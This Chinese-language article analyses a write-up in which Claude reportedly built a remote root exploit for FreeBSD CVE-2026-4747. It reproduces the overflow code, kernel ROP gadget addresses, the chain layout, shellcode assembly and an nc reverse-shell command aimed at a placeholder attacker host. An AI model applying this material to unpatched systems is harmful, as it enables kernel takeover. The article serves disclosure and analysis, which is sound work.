---
title: "Claude自主发现FreeBSD远程内核RCE漏洞：AI安全研究里程碑"
description: "CVE-2026-4747, FreeBSD, 远程代码执行, Claude, AI安全研究, 内核漏洞, RPCSEC_GSS, ROP链, 内核shellcode"
---

# Claude 自主构建 FreeBSD 远程内核 RCE 完整利用链 (CVE-2026-4747)

> 原文链接：https://github.com/califio/publications/blob/main/MADBugs/CVE-2026-4747/write-up.md
> Califio 博客：https://blog.calif.io/p/mad-bugs-claude-wrote-a-full-freebsd
> FreeBSD 安全公告：FreeBSD-SA-26:08.rpcsec_gss
> 发布日期：2026-03-31
> HN 热度：184 分 + 80 条评论

## 速查卡

| 项目 | 内容 |
|---|---|
| 一句话总结 | Claude 自主完成了从漏洞发现到远程 root shell 的完整内核级利用链——源码审计、栈布局逆向、ROP 链设计、内核 shellcode 编写、多轮远程利用，全链路自主 |
| 大白话版 | Anthropic 的 Claude 拿到 FreeBSD 内核源码后，自己找到一个没人发现的缓冲区溢出漏洞，自己搞清楚内存布局，自己写了 15 轮攻击代码，最终在远程机器上拿到了最高权限的 root shell。人类研究员全程基本只是下达指令和等结果 |
| 核心数字 | 128 字节栈缓冲区 / 最大 304 字节溢出 / 15 轮攻击 / 432 字节内核 shellcode / ~4 小时计算时间 / 44 条人类 prompt / 影响 FreeBSD 13.5-15.0 四个大版本 |
| 评级 | **S** — AI 安全研究领域的分水岭事件。不是发现漏洞，不是写 PoC crash，而是完整的远程内核级利用链直达 root shell |
| 代码 | 完整 write-up 和 exploit.py 已在 [GitHub](https://github.com/califio/publications/tree/main/MADBugs/CVE-2026-4747) 公开 |
| 关键词 | CVE-2026-4747, 远程内核 RCE, 栈缓冲区溢出, RPCSEC_GSS, NFS, ROP 链, 内核 shellcode, kproc_create, kern_execve, De Bruijn |

## 事件全貌

### 发生了什么

2026 年 3 月 26 日，FreeBSD 发布安全公告 FreeBSD-SA-26:08.rpcsec_gss，修补了一个 RPCSEC_GSS 认证模块中的远程内核代码执行漏洞，编号 CVE-2026-4747。公告的致谢栏写着一个不寻常的名字："Nicholas Carlini using Claude, Anthropic"。

三天后的 3 月 29 日上午 9:45 PDT，安全研究团队 Califio 向 Claude 发出第一条 prompt。到下午 5:00 PDT，Claude 交出了两个可以工作的完整远程内核利用——两个都是第一次尝试即成功。墙上时间 8 小时，其中人类大部分时间离开键盘，Claude 的实际工作时间约 4 小时。

Califio 随后发布了一份极其详细的 write-up，完整记录了 Claude 从零到 root shell 的全过程。这不是一个 PoC crash 演示，不是一个理论分析，而是一个可以在真实 FreeBSD 系统上远程获取 uid=0 交互式 shell 的完整武器化利用链。

### 时间线

| 时间 | 事件 |
|---|---|
| 2026-03-26 | FreeBSD 发布 SA-26:08.rpcsec_gss 安全公告，修补 CVE-2026-4747 |
| 2026-03-29 09:45 PDT | Califio 向 Claude 发出第一条 prompt |
| 2026-03-29 ~14:00 PDT | Claude 完成第一个利用策略（15 轮 ROP + shellcode） |
| 2026-03-29 ~16:30 PDT | Claude 完成第二个利用策略（6 轮 SSH key 注入，未最终采用） |
| 2026-03-29 17:00 PDT | 两个利用均验证成功，获得 root shell |
| 2026-03-31 | Califio 公开完整 write-up 和 exploit 代码 |
| 2026-04-01 | 登上 Hacker News 首页，184 分 + 80 条评论 |

### Claude 做了什么——六个问题的自主解决

Califio 的 write-up 将整个利用过程分解为六个独立的技术难题。Claude 在人类仅提供高层指令（44 条 prompt）的情况下，自主解决了所有六个问题：

**问题 1：实验环境搭建。** Claude 配置了一个完整的 FreeBSD 测试 VM——安装 NFS 服务、配置 MIT Kerberos KDC、加载有漏洞的 `kgssapi.ko` 内核模块、设置网络可达的溢出触发路径。Claude 还自行判断出需要 2 个以上 CPU（FreeBSD 每 CPU 启动 8 个 NFS 线程，15 轮攻击需要 15 个线程，1 CPU 只有 8 个不够用）。

**问题 2：多包递送策略。** 由于 XDR 层限制 RPCSEC_GSS 凭证体最大 400 字节，单次溢出只能携带约 200 字节 ROP 链，不足以放下 432 字节 shellcode。Claude 设计了 15 轮渐进式攻击：第 1 轮通过 ROP 链将内核 BSS 段改为可执行，第 2-14 轮每轮写入 32 字节 shellcode（共 13 轮 = 416 字节），第 15 轮写入最后 16 字节并跳转执行。

**问题 3：线程安全退出。** 每轮溢出劫持一个 NFS 工作线程的控制流。如果线程异常终止会触发 kernel panic，导致后续轮次无法继续。Claude 的解决方案：每轮 ROP 链末尾调用 `kthread_exit()` 干净终止当前线程，保持 NFS 服务存活以接受下一轮攻击。

**问题 4：偏移量调试。** Claude 最初基于反汇编得到的栈偏移是错误的。实际的 GSS 凭证头部包含一个 16 字节的 context handle 加上 XDR 对齐填充，导致所有偏移多了 32 字节。Claude 使用 De Bruijn 循环序列注入溢出数据，从内核 crash dump 中读取寄存器值，反查序列位置，精确校正了偏移——确定返回地址位于凭证体字节 200，而非最初假设的 168。

**问题 5：内核态到用户态的转换。** NFS 工作线程是纯内核线程，没有用户地址空间（vmspace）、trapframe 和用户态切换机制，不能直接执行 `execve()` 系统调用。Claude 设计了一条多级转换路径：`kproc_create()` 创建带完整进程结构的新内核进程 -> `kern_execve()` 将进程替换为 `/bin/sh` -> 清除 `P_KPROC` 标志让 `fork_exit()` 走正常 `userret()` 路径 -> 通过 `iretq` 进入用户态执行 shell。

**问题 6：硬件调试寄存器 bug。** 新创建的子进程继承了 DDB（FreeBSD 内核调试器）留下的陈旧硬件断点，导致 trap 1 异常崩溃。Claude 诊断出问题根因，在 shellcode 中加入 `xor eax, eax; mov dr7, rax` 清除 DR7 寄存器。

## 漏洞技术深度分析

### 根因：128 字节栈缓冲区的经典溢出

漏洞位于 `sys/rpc/rpcsec_gss/svc_rpcsec_gss.c` 文件的 `svc_rpc_gss_validate()` 函数。这个函数负责验证 RPCSEC_GSS 认证请求的 GSS-API 签名。

核心代码：

```c
static bool_t svc_rpc_gss_validate(struct svc_rpc_gss_client *client,
    struct rpc_msg *msg, gss_qop_t *qop, rpc_gss_proc_t gcproc)
{
    int32_t rpchdr[128 / sizeof(int32_t)]; // 128 字节栈缓冲区
    int32_t *buf;

    // 写入 8 个固定 RPC 头部字段（32 字节）
    buf = rpchdr;
    IXDR_PUT_LONG(buf, msg->rm_xid);
    IXDR_PUT_LONG(buf, msg->rm_direction);
    IXDR_PUT_LONG(buf, msg->rm_call.cb_rpcvers);
    IXDR_PUT_LONG(buf, msg->rm_call.cb_prog);
    IXDR_PUT_LONG(buf, msg->rm_call.cb_vers);
    IXDR_PUT_LONG(buf, msg->rm_call.cb_proc);
    IXDR_PUT_LONG(buf, gc->gc_proc);
    IXDR_PUT_LONG(buf, gc->gc_seq);
    // buf 现在指向 rpchdr + 32 字节，剩余空间 96 字节

    if (oa->oa_length) {
        // BUG: 没有对 oa_length 做任何边界检查！
        // 如果 oa_length > 96，memcpy 将溢出 rpchdr 缓冲区
        memcpy((caddr_t)buf, oa->oa_base, oa->oa_length);
    }
}
```

关键数学：
- `rpchdr` 总大小：128 字节
- 8 个 `IXDR_PUT_LONG` 写入：8 * 4 = 32 字节
- 凭证体剩余空间：128 - 32 = **96 字节**
- XDR 协议允许的最大凭证长度（`MAX_AUTH_BYTES`）：**400 字节**
- 最大溢出量：400 - 96 = **304 字节**

304 字节的溢出足以覆盖所有保存的寄存器（RBX, R12-R15, RBP）、返回地址，以及返回地址后面 192 字节的 ROP 链空间。

### 修复：一行代码

FreeBSD 14.4-RELEASE-p1 的修复补丁在 `memcpy` 之前加入了一行边界检查：

```c
if (oa->oa_length > sizeof(rpchdr) - 8 * BYTES_PER_XDR_UNIT) {
    rpc_gss_log_debug("auth length %d exceeds maximum", oa->oa_length);
    client->cl_state = CLIENT_STALE;
    return (FALSE);
}
```

`8 * BYTES_PER_XDR_UNIT` = 8 * 4 = 32 字节（固定头部大小）。凭证体超过 96 字节即被拒绝。

这是教科书式的"一行修复"——发现漏洞需要深入理解 RPC 协议栈和内核栈布局，修复只需要一个 `if` 语句。

### 栈布局精确测绘

Claude 通过两种方法确定栈布局：首先反汇编 `kgssapi.ko` 的函数 prologue 得到初始估计，然后用 De Bruijn 循环模式验证和校正。

`svc_rpc_gss_validate()` 的栈帧结构：

```
[rbp - 0xe0]  局部变量区（栈底方向）
[rbp - 0xc0]  rpchdr[0]        ← memset 清零目标
[rbp - 0xa0]  rpchdr[32]       ← memcpy 起始位置（buf 指向这里）
[rbp - 0x40]  rpchdr[128]      ← 缓冲区结束边界
              ──── 以下为溢出区域 ────
[rbp - 0x38]  ...局部变量尾部...
[rbp - 0x30]  saved RBX
[rbp - 0x28]  saved R12
[rbp - 0x20]  saved R13
[rbp - 0x18]  saved R14
[rbp - 0x10]  saved R15
[rbp - 0x08]  saved RBP
[rbp + 0x00]  RETURN ADDRESS    ← ROP 链第一个 gadget
[rbp + 0x08]  ROP chain...      ← 最多 192 字节
```

映射到凭证体字节偏移：

```
凭证体 [0..35]      → GSS 头部（version, proc, seq, service, 16字节handle）
凭证体 [36..151]    → 填充区（rpchdr 剩余 + 局部变量）
凭证体 [152..159]   → saved RBX  ← 用于预加载 kproc_create 地址
凭证体 [160..167]   → saved R12
凭证体 [168..175]   → saved R13
凭证体 [176..183]   → saved R14
凭证体 [184..191]   → saved R15
凭证体 [192..199]   → saved RBP
凭证体 [200..207]   → RETURN ADDRESS（第一个 ROP gadget）
凭证体 [208..399]   → ROP 链继续区（192 字节 = 24 个 qword）
```

De Bruijn 模式校正的关键发现：初始假设将返回地址定位在凭证体字节 168，但实际位于字节 200——差了 32 字节。偏差原因是 GSS 凭证头部包含一个 16 字节的 context handle 以及 XDR 对齐填充，这些在最初的静态分析中被遗漏。Claude 通过注入 De Bruijn 循环序列（一种保证所有 n 字节子串唯一的特殊序列），从内核 panic dump 中读取 RIP 寄存器值，反查该值在序列中的位置，精确定位了真实偏移。

### ROP Gadget 兵器库

FreeBSD 14.x 没有内核 KASLR（Kernel Address Space Layout Randomization），内核基地址固定为 `K = 0xffffffff80200000`。Claude 使用 ROPgadget 工具从内核镜像中扫描出以下关键 gadget：

| 用途 | 汇编指令 | 地址 |
|---|---|---|
| 设置 RDI | `pop rdi; ret` | `K + 0x1adcda` |
| 设置 RSI | `pop rsi; ret` | `K + 0x1cdf98` |
| 设置 RDX | `pop rdx; ret` | `K + 0x5fa429` |
| 设置 RAX | `pop rax; ret` | `K + 0x400cb4` |
| 任意 8 字节写 | `mov [rdi], rax; ret` | `0xffffffff80e3457c` |

这五个 gadget 组成了一个强大的写原语：`pop rdi`（目标地址）+ `pop rax`（要写入的数据）+ `mov [rdi], rax`（执行写入），每次写 8 字节（一个 qword）。

### 15 轮攻击的完整流程

整个攻击在约 45 秒内完成（15 轮 x ~3 秒/轮）：

**第 1 轮：使内核 BSS 段可执行**

ROP 链调用内核函数 `pmap_change_prot()`：

```
pmap_change_prot(0xffffffff8198a000, 0x2000, VM_PROT_ALL)
```

- 第一个参数（RDI）：BSS 段中选定的 2 页内存地址
- 第二个参数（RSI）：`0x2000` = 8192 字节（2 页）
- 第三个参数（RDX）：`VM_PROT_ALL = 7`（读 + 写 + 执行）

执行后，内核 BSS 区域从只读/写变为可执行。ROP 链末尾调用 `kthread_exit()` 干净终止当前 NFS 线程。

**第 2-14 轮：分批写入 shellcode（13 轮 x 32 字节 = 416 字节）**

每轮的 ROP 链结构相同，写入 4 个 qword（32 字节）：

```
pop rdi; ret          → 目标地址 (BSS + offset)
pop rax; ret          → shellcode 数据 (8 字节)
mov [rdi], rax; ret   → 写入第 1 个 qword

pop rdi; ret          → 目标地址 (BSS + offset + 8)
pop rax; ret          → shellcode 数据 (8 字节)
mov [rdi], rax; ret   → 写入第 2 个 qword

pop rdi; ret          → 目标地址 (BSS + offset + 16)
pop rax; ret          → shellcode 数据 (8 字节)
mov [rdi], rax; ret   → 写入第 3 个 qword

pop rdi; ret          → 目标地址 (BSS + offset + 24)
pop rax; ret          → shellcode 数据 (8 字节)
mov [rdi], rax; ret   → 写入第 4 个 qword

<kthread_exit 调用>   → 干净退出线程
```

每轮写入 32 字节的原因：192 字节 ROP 链空间中，每次写需要 3 个 gadget（3 x 8 = 24 字节）加上 2 个数据值（2 x 8 = 16 字节），共 40 字节/次写入。4 次写入 = 160 字节，加上线程退出代码，正好塞进 192 字节。

**第 15 轮：写入最后 16 字节 + 跳转执行**

写入 shellcode 的最后 2 个 qword，然后 ROP 链直接跳转到 BSS 区域的 shellcode 入口点。

每一轮都需要重新建立 Kerberos GSS 上下文，因为上一轮的 NFS 线程已经被终止。

### Shellcode 架构：432 字节的内核态代码

这是整个利用中技术密度最高的部分。Claude 编写了 432 字节的内核态 shellcode，分为三个阶段。

**阶段一：入口函数（字节 0-79），在被劫持的 NFS 线程上运行**

```asm
; 切换到干净的栈（BSS 区域），避免使用被溢出破坏的 NFS 线程栈
mov rax, 0xffffffff8198bf00    ; BSS 区域的干净栈地址
mov rsp, rax

; 设置 kproc_create() 的六个参数
lea rdi, [rip + worker_fn]     ; arg1: 工作函数指针
xor esi, esi                   ; arg2: NULL (arg passed to func)
xor edx, edx                   ; arg3: NULL (newpp - don't return proc ptr)
xor ecx, ecx                   ; arg4: flags = 0
xor r8d, r8d                   ; arg5: pages = 0 (default stack)
mov r9, <"/bin/sh" string>     ; arg6: 进程名称（显示在 ps 中）

; 关键：清除硬件调试寄存器
; DDB 遗留的断点会导致子进程 trap 1 崩溃
xor eax, eax
mov dr7, rax                   ; DR7 = 0, 禁用所有硬件断点

; 调用 kproc_create（地址已通过溢出预加载到 RBX）
call rbx                       ; kproc_create 地址在 saved RBX 中

; 退出当前 NFS 线程
mov rax, <kthread_exit addr>
call rax
```

这里有一个精妙的空间优化：`call rbx` 只需要 2 字节，而 `mov rax, imm64; call rax` 需要 10 字节。Claude 利用栈溢出中 saved RBX 的位置（凭证体字节 152-159），在溢出数据中预先放置 `kproc_create` 的地址。函数返回时恢复 RBX 即自动加载了目标地址。这种利用保存寄存器恢复机制来预加载函数地址的技巧，在 432 字节的严格空间限制下至关重要。

**阶段二：工作函数（字节 80-380），在新内核进程中运行**

`kproc_create` 通过 `fork1()` 创建新进程，新进程有独立的 vmspace 和 trapframe。工作函数在 `fork_exit()` 回调中执行：

```asm
; 1. 在栈上分配并清零 image_args 结构体（128 字节）
lea rdi, [rbp - 0x80]         ; 结构体地址
xor eax, eax
mov ecx, 16                    ; 16 个 qword
rep stosq                      ; memset(&args, 0, 128)

; 2. 添加可执行文件路径
lea rdi, [rbp - 0x80]         ; &args
mov rsi, <"/bin/sh" addr>      ; 路径字符串
mov edx, 1                     ; UIO_SYSSPACE (内核空间字符串)
call exec_args_add_fname

; 3. 添加 "-c" 参数
lea rdi, [rbp - 0x80]
mov rsi, <"-c" addr>
call exec_args_add_arg

; 4. 添加反向 shell 命令
lea rdi, [rbp - 0x80]
mov rsi, <command addr>        ; "mkfifo /tmp/f;sh</tmp/f|nc ATTACKER PORT>/tmp/f"
call exec_args_add_arg

; 5. 调用 kern_execve 替换进程映像
mov rdi, gs:[0]                ; curthread (线程局部存储)
mov rax, [rdi + 0x08]         ; td->td_proc
mov rcx, [rax + 0x208]        ; proc->p_vmspace (第 4 个参数)
lea rsi, [rbp - 0x80]         ; &args (第 2 个参数)
xor edx, edx                   ; NULL MAC label (第 3 个参数)
call kern_execve               ; 返回 EJUSTRETURN (-2)

; 6. 关键：清除 P_KPROC 标志
mov rax, [rdi + 0x08]         ; td->td_proc
and byte [rax + 0xb8], 0xfb   ; 清除 p_flag 中的 P_KPROC 位 (0x04)

ret                            ; 返回到 fork_exit()
```

`kern_execve()` 成功后返回 `EJUSTRETURN (-2)`，表示 trapframe 已被修改为指向 `/bin/sh` 的入口点。但此时进程仍在内核态。

清除 `P_KPROC` 标志是最关键的一步。`kproc_create()` 创建的进程带有 `P_KPROC` 标志（`proc->p_flag` 偏移 0xb8 处的第 2 位），这个标志告诉 `fork_exit()`：工作函数返回后调用 `kthread_exit()` 终止进程。如果不清除这个标志，进程在执行 `/bin/sh` 之前就会被杀死。

清除后，`fork_exit()` 走正常路径：调用 `userret()` 处理信号和调度，然后执行 `iretq` 指令从内核态返回用户态。CPU 的特权级从 ring 0 切换到 ring 3，RIP 跳转到 `/bin/sh` 的 ELF 入口点，以 uid=0 (root) 身份开始执行。

**阶段三：字符串数据（字节 381-425）**

```
偏移 381: "/bin/sh\0"
偏移 389: "-c\0"
偏移 392: "mkfifo /tmp/f;sh</tmp/f|nc ATTACKER_IP ATTACKER_PORT>/tmp/f\0"
```

反向 shell 通过命名管道（FIFO）实现双向通信：`mkfifo` 创建管道，`sh` 从管道读取命令，`nc` 将 shell 的输出发送到攻击者并将攻击者的输入写入管道。

### 攻击前提条件与实际风险评估

| 条件 | 说明 | 难度 |
|---|---|---|
| NFS 服务 | 目标必须运行 NFS 服务器且加载了 `kgssapi.ko` 内核模块 | 中等——企业环境常见 |
| Kerberos ticket | 攻击者必须拥有有效的 Kerberos ticket，对应 NFS 服务主体 `nfs/HOSTNAME@REALM` | 关键限制——需要域账户 |
| 网络访问 | 需要访问 NFS 端口 2049/TCP 和 KDC 端口 88/TCP | 中等——通常在内网 |
| CPU 数量 | 目标机器需要 >= 2 个 CPU（16 个 NFS 线程），否则线程在第 9 轮耗尽 | 低——大多数服务器满足 |
| 无 KASLR | FreeBSD 14.x 没有内核 KASLR，利用中的所有地址是硬编码的 | 对攻击者有利 |

**Kerberos 要求的深层含义：** 没有有效的 GSS 上下文，服务器在第 3 步（调用 `svc_rpc_gss_validate()` 之前）就返回 `AUTH_REJECTEDCRED` 拒绝请求，有漏洞的 `memcpy()` 永远不会被执行。这意味着互联网上的随机扫描器无法直接利用此漏洞。

但在企业环境中——Active Directory 或 FreeIPA 域环境——任何非特权域用户都可以获取 Kerberos ticket。这将攻击面从"随机互联网攻击"缩小到"已有域凭据的内部攻击者"或"已窃取域凭据的外部攻击者"，后者在真实 APT 攻击中极为常见。

**关于 Kerberos 配置的技术细节：** Claude 在配置攻击环境时发现，`/etc/krb5.conf` 中必须设置 `rdns = false` 和 `dns_canonicalize_hostname = false`，否则 Kerberos 库会对目标主机名进行反向 DNS 查找，导致 principal 名称从 `nfs/test@REALM` 变成 `nfs/localhost@REALM`，认证失败。这个"小"配置问题会让很多人类研究员卡上很久。

### 影响范围

| 版本 | 是否受影响 | 修复版本 |
|---|---|---|
| FreeBSD 13.5-RELEASE | 是 (< p11) | p11 |
| FreeBSD 14.3-RELEASE | 是 (< p10) | p10 |
| FreeBSD 14.4-RELEASE | 是 (< p1) | p1 |
| FreeBSD 15.0-RELEASE | 是 (< p5) | p5 |

测试验证环境：FreeBSD 14.4-RELEASE amd64，GENERIC 内核，无 KASLR。

## Claude 的角色——技术能力链条分析

这个案例的核心价值不在于漏洞本身（这是一个经典的 C 语言缓冲区溢出），而在于 Claude 展现的完整能力链条。从安全研究的角度，从漏洞发现到可用利用之间有一条极长的技术链，历史上这条链需要高级安全研究员花费数周到数月完成。

```
源码审计（静态分析）
  ├→ 在数万行 RPC 代码中识别出 memcpy 缺少边界检查
  ├→ 计算缓冲区可用空间（128 - 32 = 96 字节）
  └→ 理解 XDR 协议层允许最大 400 字节凭证（溢出上限 304 字节）
        ↓
栈布局逆向工程
  ├→ 反汇编 kgssapi.ko 中的函数 prologue
  ├→ 确定保存寄存器和返回地址在栈上的精确位置
  ├→ 发现初始偏移估计错误（差 32 字节）
  └→ 使用 De Bruijn 循环模式进行实验验证和校正
        ↓
利用策略设计
  ├→ 认识到 400 字节凭证限制导致不能单包利用
  ├→ 设计 15 轮渐进式攻击策略
  ├→ 第 1 轮修改内核内存权限
  └→ 后续轮次分批写入 shellcode
        ↓
ROP 链构造
  ├→ 使用 ROPgadget 从内核镜像中扫描可用 gadget
  ├→ 选择 5 个核心 gadget（pop rdi/rsi/rdx/rax + mov [rdi],rax）
  └→ 在 192 字节空间限制内优化 ROP 链布局
        ↓
内核态 Shellcode 编写
  ├→ 理解 NFS 线程 vs 用户进程的架构差异
  ├→ 设计 kproc_create → kern_execve → P_KPROC 清除的转换路径
  ├→ 利用 saved RBX 预加载函数地址的空间优化技巧
  └→ 处理 DR7 调试寄存器继承的 edge case
        ↓
协议栈集成
  ├→ Kerberos 认证流程实现（GSS-API 初始化 + 上下文建立）
  ├→ 处理 MIT vs Heimdal GSS-API 令牌格式差异
  ├→ 解决 DNS 反向查找导致的 principal 名称不匹配
  └→ 实现 RPCSEC_GSS 协议的 DATA 过程封装
        ↓
端到端验证
  ├→ 搭建完整的 FreeBSD + NFS + Kerberos 测试环境
  ├→ 执行 15 轮远程攻击
  └→ 确认 uid=0 (root) 交互式 shell
```

值得注意的是，Claude 实际上写了两个完整利用，使用不同策略，两个都一次成功。第二个策略使用 6 轮攻击注入 SSH 密钥而非反向 shell，虽然最终未采用，但证明了 Claude 不仅能完成单一路径，还能自主评估和实现替代方案。

### 与之前 AI 安全研究的对比

| 维度 | 此前 AI 漏洞研究 | CVE-2026-4747 (Claude) |
|---|---|---|
| 漏洞类型 | 应用层 / Web 漏洞为主 | **内核级远程 RCE** |
| 利用完整度 | 发现漏洞 + PoC crash | **完整利用链 + root shell** |
| 技术深度 | 模式匹配 + fuzzing 辅助 | **栈布局逆向 + ROP 链 + 内核 shellcode + 内核/用户态转换** |
| 攻击复杂度 | 单阶段 | **15 轮多阶段远程攻击** |
| 人类参与度 | 需要人工指导和修正 | **44 条高层 prompt，具体技术决策全部自主** |
| 环境工程 | 通常由人类准备 | **自主搭建 FreeBSD + NFS + Kerberos 测试环境** |
| 调试能力 | 有限 | **使用 De Bruijn 模式自主调试和校正偏移** |

Mozilla 此前与 Claude 合作，在 Firefox 中发现了数百个漏洞。但那些主要是通过大规模代码审计发现的 bug，没有达到完整远程内核利用链的深度。CVE-2026-4747 代表了质的飞跃。

## 产业影响链

```
Claude 自主完成内核级远程 RCE 全链路
  │
  ├→ 防守方影响
  │    ├→ AI 辅助安全审计成为必选项而非可选项
  │    │    ├→ 开源项目（FreeBSD/Linux 内核）：AI 审计将显著加速
  │    │    ├→ 安全公司：必须整合 AI 审计能力，否则被淘汰
  │    │    └→ 企业安全团队：AI 工具将从辅助升级为核心工作流
  │    ├→ 漏洞发现的经济学将被改写
  │    │    ├→ 发现成本从"高级研究员数周"降到"AI 数小时"
  │    │    ├→ Bug bounty 项目将面临 AI 提交的洪流
  │    │    └→ 关键基础设施软件的安全审计覆盖率将大幅提升
  │    └→ 补丁响应时间压力增加
  │         └→ AI 发现漏洞的速度远超人类修补速度
  │
  ├→ 攻击方影响
  │    ├→ AI 武器化风险从理论变为现实
  │    │    ├→ 低技术攻击者可借助 AI 构建高级利用
  │    │    ├→ 国家级 APT 的攻击效率将量级提升
  │    │    └→ 漏洞利用的"技术壁垒"被大幅削平
  │    └→ Anthropic 此前已报告中国 APT 使用 Claude 攻击 30+ 组织
  │
  └→ 治理方影响
       ├→ 模型安全评估需纳入"漏洞发现与利用"维度
       ├→ 负责任披露流程需要更新——AI 发现的漏洞如何归因和报告
       └→ AI 安全能力的出口管制和使用限制讨论将加速
```

## Hacker News 社区反应

HN 讨论（184 分 / ~80 条评论）呈现出几个主要争论轴线：

**发现 vs 利用之辩。** 早期评论者指出 Claude 是从已发布的 CVE 公告出发编写利用，而非独立发现漏洞。但随后有人指出 FreeBSD 安全公告的致谢栏明确写着 "Nicholas Carlini using Claude, Anthropic"——Claude 参与了漏洞发现本身。

**FreeBSD 的 KASLR 缺失。** 多位评论者质疑 FreeBSD 14.x 没有内核 KASLR。write-up 明确提到 "FreeBSD 14.x has no KASLR"，所有利用中的内核地址都是硬编码的。评论者确认 `aslr.enable` sysctl 只影响用户空间 ASLR，不影响内核。有人链接到 FreeBSD 开发者讨论，表明 KASLR 被有意推迟以优先其他加固措施。如果有 KASLR，利用难度会显著增加——但不会不可能。

**攻防不对称性。** 最有深度的评论之一指出了一个不对称性：Claude 为已知 CVE 编写利用是一个"定义明确的任务"，但同一个模型在日常编写生产代码时引入新漏洞的风险是"静默分布在每个 PR 中的"。防守端的收益是显性的、可计量的；攻击端的风险是隐性的、弥漫的。

**Prompt 质量的反直觉发现。** 评论者注意到 Califio 给 Claude 的 prompt 质量并不高（有人说"像 10 岁小孩写的"），但 Claude 仍然能从"勉强可理解的指令"中提取意图并完成高度技术化的任务。这被视为 Claude "无限耐心"的体现——降低了安全研究的门槛，无论好坏。

**经济学问题。** 有评论者追问 token 成本和迭代循环的经济学。4 小时的 Claude 计算时间在 API 定价下大约是多少？如果答案是"几十到几百美元"，那么内核级远程 RCE 利用的成本就从"安全公司的研究项目"变成了"个人可承受"。

## 批判性分析

### 这件事为什么是分水岭

CVE-2026-4747 事件不是第一次 AI 参与安全研究，但它是第一次 AI 完成了从源码审计到远程内核 root shell 的完整链路。之前的 AI 安全研究成果——无论是 Google 的 OSS-Fuzz AI、Mozilla 与 Claude 的 Firefox 审计、还是各种 AI 辅助 bug bounty——都停留在"发现漏洞"或"生成 PoC crash"的阶段。

从漏洞发现到可用利用之间的鸿沟是巨大的。这条链上的每一步都需要不同类型的专业知识：协议分析、逆向工程、二进制利用、操作系统内核内部机制、汇编编程。传统上，能走完这条全链路的安全研究员在全球不超过几百人。Claude 在 4 小时内做到了。

### "一行修复"的悖论

128 字节的栈缓冲区少了一行边界检查，结果就是远程内核级 RCE。这种漏洞模式在 C 语言代码中极为常见——没有边界检查的 `memcpy` 可能存在于成千上万个内核子系统中。差别仅仅在于：大部分 `memcpy` 的输入不可达或不可控，而这个恰好位于网络可达的 RPC 认证路径上。

AI 的大规模代码审计能力意味着这类"已存在多年但没人发现"的漏洞将被系统性地挖掘出来。这对安全是好事（漏洞被修复），但过渡期是危险的（发现速度远超修补速度）。

### 双刃剑效应的量化

**积极面：**
- 安全审计成本从"数周研究员时间"降到"数小时 AI 计算"
- 开源软件安全性将系统性受益——FreeBSD、Linux、OpenSSL 等关键基础设施
- 更多代码库可以被审计，不再受限于安全研究员的稀缺
- 负责任披露的效率提升：Califio 第一时间通知了 FreeBSD

**消极面：**
- 攻击者可以使用相同能力——这不是假设，Anthropic 自己已报告过 APT 使用案例
- 利用开发的"技术壁垒"被削平——从"需要顶级安全研究员"变为"需要 AI 访问权限"
- FreeBSD 没有 KASLR 降低了利用难度，但 Claude 处理 ASLR 只是时间（和 token）问题
- 44 条 prompt 中包含了方向性指导——但随着模型能力增长，需要的指导会越来越少

### 对 KASLR 和缓解措施的启示

HN 讨论中反复出现的一个主题：FreeBSD 14.x 没有 KASLR。如果有 KASLR，利用中所有硬编码的内核地址（5 个 ROP gadget、BSS 地址、各种内核函数地址）都需要通过信息泄露来获取。这会让利用从"确定性"变为"概率性"，显著增加难度。

但这不应该让有 KASLR 的系统（Linux）感到安全。KASLR 增加了一步（信息泄露），而 Claude 已经证明了处理复杂多步攻击的能力。信息泄露漏洞在内核中同样常见。问题不是"能不能绕过 KASLR"，而是"需要多少额外的 token"。

### 长期追踪建议

这个案例标志着 AI 辅助安全研究从概念验证进入实际产出阶段。2026 年预计会有更多 AI 发现的高危漏洞被披露。值得持续追踪的信号：

1. **AI 发现的 CVE 数量增长曲线** — 目前是单个案例，如果变成每周多个，产业影响将质变
2. **FreeBSD/Linux 等项目是否会将 AI 审计纳入发布流程** — 从被动修补到主动扫描
3. **模型安全评估框架的更新** — 漏洞发现能力是否会成为 AI 安全评估的标准维度
4. **利用开发成本的下降速度** — 当成本低于 bug bounty 奖金时，经济激励将推动大规模 AI 审计
5. **Anthropic 的 Responsible Scaling Policy 在网络安全维度的演进** — 模型能力增长如何与使用限制平衡
